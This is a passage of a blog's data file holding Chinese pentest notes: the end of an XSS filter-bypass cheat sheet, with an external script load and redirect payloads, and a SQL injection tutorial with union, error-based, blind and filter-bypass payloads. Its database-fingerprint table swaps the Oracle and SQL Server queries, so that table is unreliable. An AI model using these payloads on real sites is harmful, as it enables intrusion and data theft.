id=\"3-2-1-6-将JS文件重命名为图像\"><a href=\"#3-2-1-6-将JS文件重命名为图像\" class=\"headerlink\" title=\"3.2.1.6 将JS文件重命名为图像\"></a>3.2.1.6 将JS文件重命名为图像</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;http://xss.rooks/xss.jpg&quot;</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-2-过滤空格-x2F-引号\"><a href=\"#3-2-2-过滤空格-x2F-引号\" class=\"headerlink\" title=\"3.2.2 过滤空格&#x2F;引号\"></a>3.2.2 过滤空格&#x2F;引号</h3><h4 id=\"3-2-2-1-使用-x2F-代替\"><a href=\"#3-2-2-1-使用-x2F-代替\" class=\"headerlink\" title=\"3.2.2.1 使用&#x2F;代替\"></a>3.2.2.1 使用&#x2F;代替</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(/xss/);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-3-过滤单-x2F-双引号\"><a href=\"#3-2-3-过滤单-x2F-双引号\" class=\"headerlink\" title=\"3.2.3 过滤单&#x2F;双引号\"></a>3.2.3 过滤单&#x2F;双引号</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># 使用反引号代替<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>`<span class=\"hljs-attr\">xss</span>`);&gt;</span><br># 编码绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(&amp;#x27;xss&amp;#x27;);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-4-过滤括号\"><a href=\"#3-2-4-过滤括号\" class=\"headerlink\" title=\"3.2.4 过滤括号\"></a>3.2.4 过滤括号</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># 使用 throw 绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">onerror=alert;<span class=\"hljs-keyword\">throw</span> <span class=\"hljs-number\">1337</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br>&gt; onerror在每次javascript执行异常时都会被激活，调用指定的处理程序，并且throw语句可创建一个发送到onerror处的包含表达式的自定义异常。因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。<br><br># 使用``代替<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">alert<span class=\"hljs-string\">`1`</span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><br># HTML编码绕过<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-handlebars\"><span class=\"language-xml\">alert<span class=\"hljs-symbol\">&amp;#x28;</span>1<span class=\"hljs-symbol\">&amp;#x29;</span></span></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-5-过滤URL地址\"><a href=\"#3-2-5-过滤URL地址\" class=\"headerlink\" title=\"3.2.5 过滤URL地址\"></a>3.2.5 过滤URL地址</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"># 使用URL编码<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">77</span>%<span class=\"hljs-attr\">2e</span>%<span class=\"hljs-attr\">62</span>%<span class=\"hljs-attr\">61</span>%<span class=\"hljs-attr\">69</span>%<span class=\"hljs-attr\">64</span>%<span class=\"hljs-attr\">75</span>%<span class=\"hljs-attr\">2e</span>%<span class=\"hljs-attr\">63</span>%<span class=\"hljs-attr\">6f</span>%<span class=\"hljs-attr\">6d</span>/`&gt;</span><br><br># 使用IP<br># 使用进制转换<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">2130706433</span>/`&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">0177.0.0.01</span>/`&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`<span class=\"hljs-attr\">http:</span>//<span class=\"hljs-attr\">0x7f.0x0.0x0.0x1</span>/`&gt;</span><br><br># html标签中用//可以代替http://<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`//<span class=\"hljs-attr\">www.baidu.com</span>`&gt;</span><br><br># 使用\\\\<br>但是要注意在windows下\\本身就有特殊用途，是一个 path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">document.location</span>=`\\\\<span class=\"hljs-attr\">www.baidu.com</span>`&gt;</span><br><br># 使用中文句号代替英文点号<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span><br><br># 利用data类型的url代替http://<br>data:text,alert()<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-利用\"><a href=\"#4-利用\" class=\"headerlink\" title=\"4 利用\"></a>4 利用</h1><p><a href=\"https://xss.pt/xss.php?do=login\">XSS plamform</a></p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e6%80%bb%e7%bb%93/\">xss总结</a><br><a href=\"https://johnfrod.top/%e5%ae%89%e5%85%a8/xss%e7%bc%96%e7%a0%81%e5%89%96%e6%9e%90/\">xss编码剖析</a><br><a href=\"https://saucer-man.com/information_security/103.html\">探索XSS利用编码绕过的原理</a></p>\n"},{"title":"经典漏洞-SQL注入","excerpt":"原理、类型、检测、权限提升……","index_img":"/img/article-head/-.png","date":"2022-08-04T04:30:25.000Z","updated":"2022-08-10T04:30:25.000Z","hide":false,"_content":"\n- [1 原理 & 类型](#1-原理--类型)\n  - [1.1 SQL 注入原理](#11-sql-注入原理)\n  - [1.2 SQL注入的类型(按技巧分类)](#12-sql注入的类型按技巧分类)\n- [2 检测手段](#2-检测手段)\n  - [2.1 注入点是否存在 & 数据类型](#21-注入点是否存在--数据类型)\n    - [2.1.1 添加单引号](#211-添加单引号)\n    - [2.1.2 添加运算符](#212-添加运算符)\n  - [2.2 注入类型](#22-注入类型)\n    - [2.2.1 堆叠注入](#221-堆叠注入)\n    - [2.2.2 报错注入](#222-报错注入)\n      - [2.2.2.1 联合查询注入](#2221-联合查询注入)\n        - [表的字段数量判断](#表的字段数量判断)\n        - [显示字段内容判断](#显示字段内容判断)\n      - [2.2.2.2 group by重复建冲突报错](#2222-group-by重复建冲突报错)\n      - [2.2.2.3 xpath语法错误](#2223-xpath语法错误)\n    - [2.2.3 盲注](#223-盲注)\n      - [2.2.3.1 布尔盲注](#2231-布尔盲注)\n        - [判断数据库名长度](#判断数据库名长度)\n        - [判断数据库名](#判断数据库名)\n      - [2.2.3.2 时间盲注](#2232-时间盲注)\n- [3 数据库判断](#3-数据库判断)\n  - [3.1 常见前端与数据库类型匹配](#31-常见前端与数据库类型匹配)\n  - [3.2 数据库标志性信息](#32-数据库标志性信息)\n  - [3.3 字符串处理方式](#33-字符串处理方式)\n  - [3.4 特殊符号与注释](#34-特殊符号与注释)\n- [4 绕过](#4-绕过)\n  - [4.1 关键字过滤](#41-关键字过滤)\n  - [4.2 空格过滤](#42-空格过滤)\n  - [4.3 逗号过滤/拦截](#43-逗号过滤拦截)\n  - [4.4 单引号拦截/过滤/转义](#44-单引号拦截过滤转义)\n    - [4.4.1 利用编码特性绕过。（宽字节注入）](#441-利用编码特性绕过宽字节注入)\n    - [4.4.2 利用反斜杠\\绕过](#442-利用反斜杠绕过)\n    - [4.4.3 将 utf-8 转换为 utf-16 或 utf-32](#443-将-utf-8-转换为-utf-16-或-utf-32)\n  - [4.5 数字被过滤/拦截绕过](#45-数字被过滤拦截绕过)\n  - [4.6 等号过滤](#46-等号过滤)\n  - [4.7 其他关键字过滤/拦截绕过](#47-其他关键字过滤拦截绕过)\n- [参考内容](#参考内容)\n\n# 1 原理 & 类型\n\n## 1.1 SQL 注入原理\n\n基本的SQL查询语句如下所示，其中 `$id` 为提交的变量，当这个参数没有做非常严格的过滤，通过对 `$id` 的构造，数据库能输出攻击者想要获取的内容，就造成了SQL注入的漏洞。\n\n```sql\nSELECT * FROM users WHERE id='$id' LIMIT 0,1\n```\n\n> Tips: `$id` 参数可能存在于任何参数传递的位置：\n> - GET/POST/PUT/DELETE 参数\n> - X-Forwarded-For(详细内容待补充)\n> - 查询、搜索\n> - 页码、选择菜单\n> - 账号、密码\n> - 文件名\n\n## 1.2 SQL注入的类型(按技巧分类)\n\n- 盲注\n  - 布尔盲注：只能从应用返回中推断语句执行后的布尔值\n  - 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断\n- 报错注入：应用会显示全部或者部分的报错信息\n- 堆叠注入：有的应用可以加入 ; 后一次执行多条语句\n- 联合查询注入：\n\n# 2 检测手段\n\n## 2.1 注入点是否存在 & 数据类型\n\n### 2.1.1 添加单引号\n\n修改参数 `$id` 的值，在其中加入单引号，将SQL查询内容不闭合，如下所示，页面可能会显示部分或者全部数据库报错内容(如果没有被过滤)，则存在注入点，且注入类型为字符型。\n\n```sql\nSELECT * FROM users WHERE id='$id'' LIMIT 0,1\n```\n\n### 2.1.2 添加运算符\n\n传入的参数并没有显示在报错信息中，则传入的参数前面可能没有引号包裹，于是注入的类型可能是数字型。可以通过在id后添加运算符，如-1，+2，来观察页面的内容是否会变成对应的 id 来判断是否存在注入点，此时注入类型为数字型。\n\n如下所示，将id变为1+1，+号在URL中会被编码为空格，所以我们需要提前将+号进行URL编码，变为：%2b\n\n```sql\nSELECT * FROM users WHERE id='1+1' LIMIT 0,1;\nSELECT * FROM users WHERE id='1%2b1' LIMIT 0,1;\n```\n\n## 2.2 注入类型\n\n### 2.2.1 堆叠注入\n\n分号 `;` 在sql中意味着一条语句的结束，可以在分号后继续构造第二条语句，数据库依然会继续执行，这样就会存在堆叠注入。\n\n> Tips: 堆叠注入存在局限性\n> 1. 结果不会在页面显示\n> 2. 接口或者数据库引擎不支持\n\n```sql\nSELECT * FROM users WHERE id='1';SELECT 1,database(),version(),4,5\n```\n\n### 2.2.2 报错注入\n\n#### 2.2.2.1 联合查询注入\n\n##### 表的字段数量判断\n\n在mysql、mariadb、oracle等数据库中，可以使用数字来代替对应字段(列)的名称，如果数据库中没有对应的字段(列)，就会报错。使用 order by 让 `$id` 按照不同的字段排序，直到 order by 后的数字超出了字段数量，则会返回报错信息。\n\n```sql\nSELECT * FROM users WHERE id='1' order by 1 --+ LIMIT 0,1;\n```\n\n##### 显示字段内容判断\n\nunion 联合查询时，当前面的语句为假，则后面的查询结果会显示到相应的位置。则可以通过在前面查询语句中添加 and 1=2 使语句变假，来判断页面显示的内容为表中的哪几个字段。然后使用database()和version()替换相应的字段位置就可以查询数据库名称和版本号。 \n\n```sql\nSELECT * FROM users WHERE id='-1' union select 1,2,3,4,5 --+ LIMIT 0,1;\nSELECT * FROM users WHERE id='1' and 1=2 union select 1,2,3,4,5 --+ LIMIT 0,1;\n\nSELECT * FROM users WHERE id='-1' UNION SELECT 1,database(),version(),4,5 --+\n```\n\n#### 2.2.2.2 group by重复建冲突报错\n\n```sql\nSELECT * FROM users WHERE id='2' and (\n    select 1 from (\n        select count(*),concat(\n            (\n                select database() from information_schema.tables limit 0,1  --+ 真正的查询语句\n            ),floor(rand()*2)\n        )x from information_schema.tables group by x\n    )a\n) --+\n```\n\n#### 2.2.2.3 xpath语法错误\n\nxpath 语法报错注入，主要利用extractvalue()和updatexml()函数。  \n\n使用方法：\n\n```sql\nSELECT * FROM users WHERE id='2' and extractvalue(1,concat('^',(\n    select database()  --+ 真正的查询语句\n    ),'^')) --+\n\nSELECT * FROM users WHERE id='2' and updatexml(1,concat('^',(\n    select database()  --+ 真正的查询语句\n    ),'^'),1) --+\n```\n\n### 2.2.3 盲注\n\n#### 2.2.3.1 布尔盲注\n\n##### 判断数据库名长度\n\n改变length(database())=的数值，当条件为真时，页面就会正常显示\n\n```sql\nSELECT * FROM users WHERE id='2' and length(database())=1 --+\n```\n\n##### 判断数据库名\n\n使用 sbustr 函数一位一位截取数据库名，如果为真，则页面正常显示\n\n```sql\nSELECT * FROM users WHERE id='2' and substr(database(),1,1)='s' --+\n```\n\n#### 2.2.3.2 时间盲注\n\n当页面没有布尔状态时，可以通过观察页面响应时间是否变长来判断输入的条件是否正确。\n\n```sql\nSELECT * FROM users WHERE id='1' and sleep(10) -- +' LIMIT 0,1;\nSELECT * FROM users WHERE id='1' and if((length(database())=8),sleep(10),1) --+\nSELECT * FROM users WHERE id='1' and if((substr(database(),1,1)='s'),sleep(10),1) --+\n```\n\n# 3 数据库判断\n\n## 3.1 常见前端与数据库类型匹配\n\n| 前端语言 | 数据库 |\n| - | - |\nsap | sql server，Access\n.net | sql server\nphp | PostgreSQL, Mysql\njava | mysql, oracle\n\n## 3.2 数据库标志性信息\n\n| 数据库 | 信息查询 |\n| - | - |\noracle | select@@version --\nsql server | select banner from v$version\nmysql | select @@version, version() --, lenth(user)>0\npostgreSQL | select version() --\n\n## 3.3 字符串处理方式\n\n| 数据库 | 处理方式 |\n| - | - |\nsql server | id=1 and 'a'+'b'='ab' --\nmssql | id=1 and 'a'+'b'='ab'\nmysql | id=1 and 'a'+'b'='ab', 'ab'=concat('a','b')\noracle | id=1 and 'a'+'b'='a'\\|\\|'b', 'ab'=concat('a','b')\npostgresql | id=1 and 'a'+'b'='a'\\|\\|'b', 'ab'=concat('a','b')\n\n## 3.4 特殊符号与注释\n\n1. null 和 %00 是Access支持的注释。\n2. \\# 是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’-- ',和/* */注释（注意mysql使用-- 时需要后面添加空格）\n3. – 和 /* */ 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。\n4. ; 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。\n\n```sql\n' and exists (select count(*) from sysobjects) >0 正常，就是MSSQL数据库\n' and exists (select count(*) from msysobjects) >0 两条都不正常，是Access数据库\n```\n\n# 4 绕过\n\n## 4.1 关键字过滤\n\n- 第一种是替换关键字，这种方式可以直接通过双写关键词等方式来进行绕过；\n- 第二种是关键词直接拦截，这种情况下可以通过变换函数等方式来进行绕过。\n\n## 4.2 空格过滤\n\n- 使用/**/即SQL语句中的注释语句来绕过。\n- 使用双写URL编码绕过，例如(%20 → %2%200)。\n- 通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）\n- 通过科学计数法绕过：where id=0e1union select 1,2\n- Fuzz所有字符，查找可替代空格的字符例如 %09 %0a %0b %0c %0d。\n\n| URL编码 | 符号 |\n| - | - |\n%09 | TAB 键（水平）\n%0a | 新建一行\n%0c | 新的一页\n%0d | return 功能\n%0b | TAB 键（垂直）\n%a0 | 空格\n\n数据库 | 空白字符\n| - | - |\nSQLite3 | 0A 0D 0C 09 20\nMYSQL5 | 09 0A 0B 0C 0D A0 20\nPosgresSQL | 0A 0D 0C 09 20\nOracle 11g | 00 0A 0D 0C 09 20\nMSSQL | 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20\n\n## 4.3 逗号过滤/拦截\n\n拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。\n\nsubstring和if语句都用到了逗号，因此无法使用。\n\nsubstring可以用substr()函数来进行代替，if语句可以通过and语句来进行代替。\n\n\n## 4.4 单引号拦截/过滤/转义\n\n当引号存在过滤和转义的情况下，可以这样处理：\n\n### 4.4.1 利用编码特性绕过。（宽字节注入）\n\n比较典型的使用编码就是GBK编码：使用前面的字符吃掉后面的字符(斜杆)。\n\n待补充\n\n### 4.4.2 利用反斜杠\\绕过\n\n待补充\n\n### 4.4.3 将 utf-8 转换为 utf-16 或 utf-32\n\n待补充\n\n## 4.5 数字被过滤/拦截绕过\n\n数字被屏蔽时，用响应函数结果来构造。\n\n- ceil() ：为向上取整函数\n- floor()：为向下取整函数\n- ! ~~：起到取反的效果\n- pi() ：π值\n- version()：利用当前版本号进行数字的构造\n- false：值为0\n- true：值为1\n\n## 4.6 等号过滤\n\n- 当等于号=呗过滤时，可以使用：like,in 等字符替换\n\n```sql\n?id=1' or '1' IN ('1234')#\n?id=1' or 1 like 1#\n```\n\n## 4.7 其他关键字过滤/拦截绕过\n\n关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：\n\n关键字 | 双写 | 大小写 | 其他编码 | 符号\n| - | - | - | - | - |\nand | aandnd | and | an\\x64 | &&\nselect | selselectect | SelECt | selec\\x74 | \nor | oorr | oR | o\\x72 | \\|\\|\nunion | uniunionon | uNioN | unio\\x6e | \n\n# 参考内容\n\n[sql注入总结](https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/)\n\n[注入天书](https://files.cnblogs.com/files/lcamry/mysql-injection.pdf)\n","source":"_posts/2022-08-04.经典漏洞-SQL注入.md","raw":"---\ntitle: 经典漏洞-SQL注入\nexcerpt: 原理、类型、检测、权限提升……\nindex_img: /img/article-head/-.png\ndate: \"2022/8/4 12:30:25\"\nupdated: \"2022/8/10 12:30:25\"\nhide: false\ntags:\n- Security\n- PenTest\n- 经典漏洞\ncategories:\n- Security\n- PenTest\n- 经典漏洞\n---\n\n- [1 原理 & 类型](#1-原理--类型)\n  - [1.1 SQL 注入原理](#11-sql-注入原理)\n  - [1.2 SQL注入的类型(按技巧分类)](#12-sql注入的类型按技巧分类)\n- [2 检测手段](#2-检测手段)\n  - [2.1 注入点是否存在 & 数据类型](#21-注入点是否存在--数据类型)\n    - [2.1.1 添加单引号](#211-添加单引号)\n    - [2.1.2 添加运算符](#212-添加运算符)\n  - [2.2 注入类型](#22-注入类型)\n    - [2.2.1 堆叠注入](#221-堆叠注入)\n    - [2.2.2 报错注入](#222-报错注入)\n      - [2.2.2.1 联合查询注入](#2221-联合查询注入)\n        - [表的字段数量判断](#表的字段数量判断)\n        - [显示字段内容判断](#显示字段内容判断)\n      - [2.2.2.2 group by重复建冲突报错](#2222-group-by重复建冲突报错)\n      - [2.2.2.3 xpath语法错误](#2223-xpath语法错误)\n    - [2.2.3 盲注](#223-盲注)\n      - [2.2.3.1 布尔盲注](#2231-布尔盲注)\n        - [判断数据库名长度](#判断数据库名长度)\n        - [判断数据库名](#判断数据库名)\n      - [2.2.3.2 时间盲注](#2232-时间盲注)\n- [3 数据库判断](#3-数据库判断)\n  - [3.1 常见前端与数据库类型匹配](#31-常见前端与数据库类型匹配)\n  - [3.2 数据库标志性信息](#32-数据库标志性信息)\n  - [3.3 字符串处理方式](#33-字符串处理方式)\n  - [3.4 特殊符号与注释](#34-特殊符号与注释)\n- [4 绕过](#4-绕过)\n  - [4.1 关键字过滤](#41-关键字过滤)\n  - [4.2 空格过滤](#42-空格过滤)\n  - [4.3 逗号过滤/拦截](#43-逗号过滤拦截)\n  - [4.4 单引号拦截/过滤/转义](#44-单引号拦截过滤转义)\n    - [4.4.1 利用编码特性绕过。（宽字节注入）](#441-利用编码特性绕过宽字节注入)\n    - [4.4.2 利用反斜杠\\绕过](#442-利用反斜杠绕过)\n    - [4.4.3 将 utf-8 转换为 utf-16 或 utf-32](#443-将-utf-8-转换为-utf-16-或-utf-32)\n  - [4.5 数字被过滤/拦截绕过](#45-数字被过滤拦截绕过)\n  - [4.6 等号过滤](#46-等号过滤)\n  - [4.7 其他关键字过滤/拦截绕过](#47-其他关键字过滤拦截绕过)\n- [参考内容](#参考内容)\n\n# 1 原理 & 类型\n\n## 1.1 SQL 注入原理\n\n基本的SQL查询语句如下所示，其中 `$id` 为提交的变量，当这个参数没有做非常严格的过滤，通过对 `$id` 的构造，数据库能输出攻击者想要获取的内容，就造成了SQL注入的漏洞。\n\n```sql\nSELECT * FROM users WHERE id='$id' LIMIT 0,1\n```\n\n> Tips: `$id` 参数可能存在于任何参数传递的位置：\n> - GET/POST/PUT/DELETE 参数\n> - X-Forwarded-For(详细内容待补充)\n> - 查询、搜索\n> - 页码、选择菜单\n> - 账号、密码\n> - 文件名\n\n## 1.2 SQL注入的类型(按技巧分类)\n\n- 盲注\n  - 布尔盲注：只能从应用返回中推断语句执行后的布尔值\n  - 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断\n- 报错注入：应用会显示全部或者部分的报错信息\n- 堆叠注入：有的应用可以加入 ; 后一次执行多条语句\n- 联合查询注入：\n\n# 2 检测手段\n\n## 2.1 注入点是否存在 & 数据类型\n\n### 2.1.1 添加单引号\n\n修改参数 `$id` 的值，在其中加入单引号，将SQL查询内容不闭合，如下所示，页面可能会显示部分或者全部数据库报错内容(如果没有被过滤)，则存在注入点，且注入类型为字符型。\n\n```sql\nSELECT * FROM users WHERE id='$id'' LIMIT 0,1\n```\n\n### 2.1.2 添加运算符\n\n传入的参数并没有显示在报错信息中，则传入的参数前面可能没有引号包裹，于是注入的类型可能是数字型。可以通过在id后添加运算符，如-1，+2，来观察页面的内容是否会变成对应的 id 来判断是否存在注入点，此时注入类型为数字型。\n\n如下所示，将id变为1+1，+号在URL中会被编码为空格，所以我们需要提前将+号进行URL编码，变为：%2b\n\n```sql\nSELECT * FROM users WHERE id='1+1' LIMIT 0,1;\nSELECT * FROM users WHERE id='1%2b1' LIMIT 0,1;\n```\n\n## 2.2 注入类型\n\n### 2.2.1 堆叠注入\n\n分号 `;` 在sql中意味着一条语句的结束，可以在分号后继续构造第二条语句，数据库依然会继续执行，这样就会存在堆叠注入。\n\n> Tips: 堆叠注入存在局限性\n> 1. 结果不会在页面显示\n> 2. 接口或者数据库引擎不支持\n\n```sql\nSELECT * FROM users WHERE id='1';SELECT 1,database(),version(),4,5\n```\n\n### 2.2.2 报错注入\n\n#### 2.2.2.1 联合查询注入\n\n##### 表的字段数量判断\n\n在mysql、mariadb、oracle等数据库中，可以使用数字来代替对应字段(列)的名称，如果数据库中没有对应的字段(列)，就会报错。使用 order by 让 `$id` 按照不同的字段排序，直到 order by 后的数字超出了字段数量，则会返回报错信息。\n\n```sql\nSELECT * FROM users WHERE id='1' order by 1 --+ LIMIT 0,1;\n```\n\n##### 显示字段内容判断\n\nunion 联合查询时，当前面的语句为假，则后面的查询结果会显示到相应的位置。则可以通过在前面查询语句中添加 and 1=2 使语句变假，来判断页面显示的内容为表中的哪几个字段。然后使用database()和version()替换相应的字段位置就可以查询数据库名称和版本号。 \n\n```sql\nSELECT * FROM users WHERE id='-1' union select 1,2,3,4,5 --+ LIMIT 0,1;\nSELECT * FROM users WHERE id='1' and 1=2 union select 1,2,3,4,5 --+ LIMIT 0,1;\n\nSELECT * FROM users WHERE id='-1' UNION SELECT 1,database(),version(),4,5 --+\n```\n\n#### 2.2.2.2 group by重复建冲突报错\n\n```sql\nSELECT * FROM users WHERE id='2' and (\n    select 1 from (\n        select count(*),concat(\n            (\n                select database() from information_schema.tables limit 0,1  --+ 真正的查询语句\n            ),floor(rand()*2)\n        )x from information_schema.tables group by x\n    )a\n) --+\n```\n\n#### 2.2.2.3 xpath语法错误\n\nxpath 语法报错注入，主要利用extractvalue()和updatexml()函数。  \n\n使用方法：\n\n```sql\nSELECT * FROM users WHERE id='2' and extractvalue(1,concat('^',(\n    select database()  --+ 真正的查询语句\n    ),'^')) --+\n\nSELECT * FROM users WHERE id='2' and updatexml(1,concat('^',(\n    select database()  --+ 真正的查询语句\n    ),'^'),1) --+\n```\n\n### 2.2.3 盲注\n\n#### 2.2.3.1 布尔盲注\n\n##### 判断数据库名长度\n\n改变length(database())=的数值，当条件为真时，页面就会正常显示\n\n```sql\nSELECT * FROM users WHERE id='2' and length(database())=1 --+\n```\n\n##### 判断数据库名\n\n使用 sbustr 函数一位一位截取数据库名，如果为真，则页面正常显示\n\n```sql\nSELECT * FROM users WHERE id='2' and substr(database(),1,1)='s' --+\n```\n\n#### 2.2.3.2 时间盲注\n\n当页面没有布尔状态时，可以通过观察页面响应时间是否变长来判断输入的条件是否正确。\n\n```sql\nSELECT * FROM users WHERE id='1' and sleep(10) -- +' LIMIT 0,1;\nSELECT * FROM users WHERE id='1' and if((length(database())=8),sleep(10),1) --+\nSELECT * FROM users WHERE id='1' and if((substr(database(),1,1)='s'),sleep(10),1) --+\n```\n\n# 3 数据库判断\n\n## 3.1 常见前端与数据库类型匹配\n\n| 前端语言 | 数据库 |\n| - | - |\nsap | sql server，Access\n.net | sql server\nphp | PostgreSQL, Mysql\njava | mysql, oracle\n\n## 3.2 数据库标志性信息\n\n| 数据库 | 信息查询 |\n| - | - |\noracle | select@@version --\nsql server | select banner from v$version\nmysql | select @@version, version() --, lenth(user)>0\npostgreSQL | select version() --\n\n## 3.3 字符串处理方式\n\n| 数据库 | 处理方式 |\n| - | - |\nsql server | id=1 and 'a'+'b'='ab' --\nmssql | id=1 and 'a'+'b'='ab'\nmysql | id=1 and 'a'+'b'='ab', 'ab'=concat('a','b')\noracle | id=1 and 'a'+'b'='a'\\|\\|'b', 'ab'=concat('a','b')\npostgresql | id=1 and 'a'+'b'='a'\\|\\|'b', 'ab'=concat('a','b')\n\n## 3.4 特殊符号与注释\n\n1. null 和 %00 是Access支持的注释。\n2. \\# 是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’-- ',和/* */注释（注意mysql使用-- 时需要后面添加空格）\n3. – 和 /* */ 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。\n4. ; 是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。\n\n```sql\n' and exists (select count(*) from sysobjects) >0 正常，就是MSSQL数据库\n' and exists (select count(*) from msysobjects) >0 两条都不正常，是Access数据库\n```\n\n# 4 绕过\n\n## 4.1 关键字过滤\n\n- 第一种是替换关键字，这种方式可以直接通过双写关键词等方式来进行绕过；\n- 